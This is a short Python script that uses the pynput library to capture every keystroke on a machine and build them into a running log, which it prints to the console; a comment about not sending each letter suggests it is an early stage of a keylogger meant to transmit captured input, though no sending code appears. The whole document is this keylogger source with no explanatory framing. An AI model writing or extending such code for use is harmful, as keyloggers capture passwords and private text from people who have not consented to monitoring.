#!/usr/bin/env python
import pynput.keyboard

# global log variable in order not to send each letter
log = ""


# process to catch keystrokes

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " "+str(key)+" "

    print(log)


keyboardListener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboardListener:
    keyboardListener.join()
